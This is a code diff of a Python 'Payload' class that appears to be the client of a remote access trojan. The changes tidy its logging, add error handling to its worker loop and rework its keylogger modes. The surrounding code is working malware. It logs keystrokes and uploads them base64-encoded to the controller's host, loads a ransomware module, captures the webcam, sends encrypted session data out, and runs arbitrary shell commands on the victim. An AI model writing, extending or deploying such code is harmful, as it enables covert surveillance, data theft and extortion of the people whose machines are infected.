@@ -128,7 +128,7 @@ class Payload():
             try:
                 info[function] = globals()[function]()
             except Exception as e:
-                log(level='info', info= "'{}' from session info returned error: {}".format(function, str(e)))
+                log("{} returned error: {}".format(function, str(e)))
         data = globals()['encrypt_aes'](json.dumps(info), self.key)
         msg = struct.pack('!L', len(data)) + data
         self.connection.sendall(msg)
@@ -142,7 +142,7 @@ class Payload():
                 raise TypeError("keyword argument 'base_url' must be type '{}'".format(str))
             if not base_url.startswith('http'):
                 raise ValueError("keyword argument 'base_url' must start with http:// or https://")
-            log(level='info', info= '[*] Searching %s' % base_url)
+            log('[*] Searching %s' % base_url)
             path = urllib2.urlparse.urlsplit(base_url).path
             base = path.strip('/').replace('/','.')
             names = [line.rpartition('</a>')[0].rpartition('>')[2].strip('/') for line in urllib2.urlopen(base_url).read().splitlines() if 'href' in line if '</a>' in line if '__init__.py' not in line]
@@ -151,7 +151,7 @@ class Payload():
                 if ext in ('.py','.pyc'):
                     module = '.'.join((base, name)) if base else name
                     if module not in target:
-                        log(level='info', info= "[+] Adding %s" % module)
+                        log("[+] Adding %s" % module)
                         target.append(module)
                 elif not len(ext):
                     t = threading.Thread(target=self._get_resources, kwargs={'target': target, 'base_url': '/'.join((base_url, n))})
@@ -193,9 +193,12 @@ class Payload():
         while True:
             jobs = self.handlers.items()
             for task, worker in jobs:
-                if not worker.is_alive():
-                    dead = self.handlers.pop(task, None)
-                    del dead
+                try:
+                    if not worker.is_alive():
+                        dead = self.handlers.pop(task, None)
+                        del dead
+                except Exception as e:
+                    log(str(e))
             if globals()['_abort']:
                 break
             time.sleep(0.5)
@@ -598,7 +601,6 @@ class Payload():
             self.load('ransom')
         return globals()['ransom'].run(args)
 
-
     @config(platforms=['win32','linux2','darwin'], command=True, usage='webcam <mode> [options]')
     def webcam(self, args=None):
         """ 
@@ -812,22 +814,22 @@ class Payload():
         except Exception as e:
             return '{} error: {}'.format(self.pastebin.func_name, str(e))
 
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='keylogger start/stop/dump/status')
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='keylogger run/stop/status/upload')
     def keylogger(self, mode=None):
         """ 
         Log user keystrokes
 
         `Required`
-        :param str mode:    run, stop, status, upload, auto
+        :param str mode:    run, stop, status, upload
         
         """
         def status():
             try:
-                mode    = 'stopped'
+                mode = 'stopped'
                 if 'keylogger' in self.handlers:
-                    mode= 'running'
-                update  = status(float(self.handlers.get('keylogger').name))
-                length  = globals()['keylogger']._buffer.tell()
+                    mode = 'running'
+                update = status(float(self.handlers.get('keylogger').name))
+                length = globals()['keylogger']._buffer.tell()
                 return "Status\n\tname: keylogger\n\tmode: {}\n\ttime: {}\n\tsize: {} bytes".format(mode, update, length)
             except Exception as e:
                 log("{} error: {}".format('keylogger.status', str(e)))
@@ -853,18 +855,16 @@ class Payload():
                     self.stop('keylogger')
                 except: pass
                 return locals()['status']()
-            elif 'auto' in mode:
-                self.handlers['keylogger'] = globals()['keylogger'].auto()
-                return locals()['status']()
             elif 'upload' in mode:
                 data = base64.b64encode(globals()['keylogger'].logs.getvalue())
+                host, port = self.connection.getpeername()
                 globals()['post']('http://{}:{}'.format(host, port), json={'data': data})
                 globals()['keylogger'].logs.reset()
                 return 'Upload complete'
             elif 'status' in mode:
                 return locals()['status']()        
             else:
-                return keylogger.usage + '\n\targs: start, stop, dump'
+                return keylogger.usage
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='screenshot <mode>')
     def screenshot(self, mode=None):
@@ -1016,7 +1016,7 @@ class Payload():
                             result = bytes(command(action) if action else command()) if command else bytes().join(subprocess.Popen(cmd, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                         except Exception as e:
                             result = "{} error: {}".format(self.run.func_name, str(e))
-                            log(level='debug', info=result)
+                            log(result)
                         task.update({'result': result})
                         self.send_task(task)
                     self.flags.prompt.set()
